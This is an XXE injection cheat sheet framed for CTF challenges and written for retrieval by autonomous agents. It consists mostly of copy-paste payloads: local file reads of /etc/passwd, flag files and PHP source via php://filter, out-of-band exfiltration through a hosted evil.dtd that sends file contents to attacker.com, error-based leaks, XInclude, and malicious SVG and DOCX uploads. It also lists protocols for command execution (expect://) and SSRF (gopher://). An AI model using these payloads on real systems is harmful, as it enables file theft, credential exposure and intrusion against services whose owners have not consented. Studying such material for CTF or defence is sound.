# XXE (XML External Entity) Injection - CTF Exploitation Reference

> **Document Purpose:** Actionable XXE techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, detection methods, and data exfiltration techniques.

---

## 1. QUICK REFERENCE: XXE Detection

> **When to use this section:** Application accepts XML input or uses XML-based formats.

### 1.1 XXE Detection Indicators

**Tags:** `xxe, detection, xml, indicators`

**When to Suspect XXE:**
- Application accepts XML input
- Content-Type: application/xml or text/xml
- SOAP endpoints
- SVG image upload
- Office documents (DOCX, XLSX)
- SAML authentication
- RSS/Atom feeds
- XML-based APIs

**Quick Detection Test:**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "XXE_TEST">]>
<root>&xxe;</root>
```

**Success:** `XXE_TEST` appears in response.

**Agent Takeaway:**
- Look for XML in requests/responses
- Test any XML input point
- SVG uploads are often overlooked XXE vectors

---

### 1.2 Basic XXE Payloads

**Tags:** `xxe, basic, payloads, file-read`

**File Disclosure (Linux):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**File Disclosure (Windows):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

**Reading /flag.txt:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<root>&xxe;</root>
```

**Agent Takeaway:**
- `file://` protocol reads local files
- Entity `&xxe;` expands to file content
- Start with `/etc/passwd` to confirm vulnerability

---

## 2. XXE FILE DISCLOSURE

> **When to use this section:** You've confirmed XXE and want to read files.

### 2.1 Classic File Read Payloads

**Tags:** `xxe, file-read, disclosure, payloads`

**Standard File Read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

**Multiple File Reads:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY passwd SYSTEM "file:///etc/passwd">
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<data>
  <passwd>&passwd;</passwd>
  <flag>&flag;</flag>
</data>
```

**Common CTF File Locations:**
```xml
<!ENTITY xxe SYSTEM "file:///flag">
<!ENTITY xxe SYSTEM "file:///flag.txt">
<!ENTITY xxe SYSTEM "file:///home/user/flag.txt">
<!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
```

**Agent Takeaway:**
- Try common flag locations
- Read config files for credentials
- Check application source code

---

### 2.2 Reading PHP Files (Base64 Wrapper)

**Tags:** `xxe, php, base64, source-code, wrapper`

**Problem:** XML parsers choke on PHP `<?` tags.

**Solution: PHP Base64 Wrapper:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root>&xxe;</root>
```

**Decode the base64 output to read PHP source.**

**Agent Takeaway:**
- Use `php://filter` for PHP files
- Works around XML parsing issues with `<?php`
- Decode base64 result to see source code

---

### 2.3 Directory Listing (PHP)

**Tags:** `xxe, directory, listing, php`

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/">
]>
<root>&xxe;</root>
```

**Note:** Works on some parsers; may show directory contents.

**Alternative with PHP:**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.">
```

---

## 3. BLIND XXE EXPLOITATION

> **When to use this section:** XXE exists but output is not reflected.

### 3.1 Out-of-Band (OOB) XXE

**Tags:** `xxe, blind, oob, exfiltration, http`

**Basic OOB Detection:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>&xxe;</root>
```

**Check your server logs for incoming request.**

**OOB File Exfiltration (Parameter Entities):**

**Step 1: Host DTD on attacker server (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Send XXE payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**Agent Takeaway:**
- Use external DTD for complex exfiltration
- Check Burp Collaborator, webhook.site, or own server
- Parameter entities (%) needed for blind exploitation

---

### 3.2 Error-Based XXE

**Tags:** `xxe, blind, error-based, exfiltration`

**Trigger Error with File Content:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

**Error message may contain file content.**

**Agent Takeaway:**
- Error messages can leak file contents
- Useful when OOB blocked
- Check application error responses

---

## 4. XXE VARIATIONS

> **When to use this section:** Standard XXE is blocked or unavailable.

### 4.1 XInclude Attacks

**Tags:** `xxe, xinclude, alternative, bypass`

**When to use:** Can't control DOCTYPE but can inject into XML.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Agent Takeaway:**
- Works when DOCTYPE is blocked
- Injects into existing XML structure
- `parse="text"` treats file as text

---

### 4.2 SVG XXE

**Tags:** `xxe, svg, image, upload, file-read`

**SVG File with XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**Save as .svg and upload to vulnerable image handler.**

**Agent Takeaway:**
- Image upload features may process SVG XML
- Output appears in rendered image
- Often overlooked attack vector

---

### 4.3 Office Document XXE (DOCX/XLSX)

**Tags:** `xxe, docx, xlsx, office, upload`

**DOCX/XLSX are ZIP files with XML inside.**

**Steps:**
1. Create legitimate .docx
2. Unzip it
3. Modify XML files to include XXE
4. Rezip and upload

**Modify word/document.xml:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**Agent Takeaway:**
- DOCX/XLSX uploads can trigger XXE
- Unzip → modify → rezip
- Check all XML files inside archive

---

## 5. XXE PROTOCOLS

> **When to use this section:** Reference for different XXE protocol handlers.

### 5.1 Protocol Reference

**Tags:** `xxe, protocols, handlers, reference`

| Protocol | Purpose | Example |
|----------|---------|---------|
| `file://` | Read local files | `file:///etc/passwd` |
| `http://` | HTTP requests (SSRF) | `http://internal.server/` |
| `https://` | HTTPS requests | `https://attacker.com/` |
| `ftp://` | FTP requests | `ftp://attacker.com/` |
| `php://` | PHP wrappers | `php://filter/convert.base64-encode/resource=file` |
| `expect://` | Command execution (PHP) | `expect://id` |
| `gopher://` | Advanced SSRF | `gopher://localhost:6379/_INFO` |
| `jar://` | Java archive read | `jar:http://host/file.jar!/path` |
| `netdoc://` | Java network docs | `netdoc:///etc/passwd` |

**Agent Takeaway:**
- `file://` for local files
- `http://` for SSRF and OOB
- `php://` for source code on PHP targets

---

## 6. CTF-SPECIFIC XXE STRATEGIES

> **When to use this section:** Solving XXE challenges in CTF.

### 6.1 XXE CTF Playbook

**Tags:** `xxe, ctf, playbook, workflow`

**Step 1: Identify XML Input**
```
Look for:
- XML in request body
- Content-Type: application/xml
- SVG/DOCX file upload
- SOAP endpoints
```

**Step 2: Test Basic XXE**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Step 3: Read Flag**
```xml
<!ENTITY xxe SYSTEM "file:///flag.txt">
<!ENTITY xxe SYSTEM "file:///flag">
<!ENTITY xxe SYSTEM "file:///home/user/flag.txt">
```

**Step 4: If Blind**
```xml
<!ENTITY xxe SYSTEM "http://attacker.com/?">
```
→ Use OOB exfiltration with external DTD

**Step 5: If DOCTYPE Blocked**
```xml
<xi:include parse="text" href="file:///flag.txt"/>
```

**Agent Takeaway:**
- Test for XXE in any XML input
- Read common flag locations
- Use OOB for blind XXE

---

### 6.2 XXE Decision Tree

**Tags:** `xxe, decision-tree, workflow`

```
START: XML input identified

TEST: Basic XXE entity
├── File content returned → SUCCESS, read flag
├── No output, no error → Blind XXE, use OOB
├── DOCTYPE blocked → Try XInclude
└── Entity blocked → Check for parameter entities

BLIND XXE:
├── Send HTTP callback to attacker server
├── If callback received → Use OOB file exfiltration
└── If no callback → May be completely blocked

ALTERNATIVES:
├── SVG upload → Embed XXE in SVG
├── Office upload → Modify XML inside DOCX/XLSX
└── XInclude → Inject into existing XML
```

---

## 7. SUMMARY: XXE Quick Reference

**Basic File Read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Read Flag:**
```xml
<!ENTITY xxe SYSTEM "file:///flag.txt">
```

**PHP Source (Base64):**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

**Blind OOB:**
```xml
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
```

**XInclude (If DOCTYPE Blocked):**
```xml
<xi:include parse="text" href="file:///flag.txt"/>
```

**Common Protocols:**
- `file://` - Local files
- `http://` - SSRF/OOB
- `php://filter` - PHP source code
